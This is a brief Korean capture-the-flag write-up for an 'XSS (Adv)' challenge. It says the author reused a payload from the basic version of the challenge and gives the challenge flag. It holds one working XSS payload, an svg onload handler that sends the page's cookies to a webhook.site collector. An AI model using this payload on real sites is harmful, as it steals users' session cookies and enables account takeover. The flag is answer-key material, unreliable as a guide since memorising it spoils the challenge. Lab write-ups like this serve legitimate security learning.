# XSS (Adv)
일반 XSS 문제에서 404 Page 등 문제가 조금 수정되었지만 주요 코드들은 그대로이길래 일반 XSS 문제에서 `vuln?param=`만 추가하여 요청을 보냈더니 flag가 전송되었다.

`vuln?param=<svg/onload=location["href"]="https://webhook.site/webhook-id/?flag="+document["cookie"]>`

## Flag
flag{404_not_found_X_X}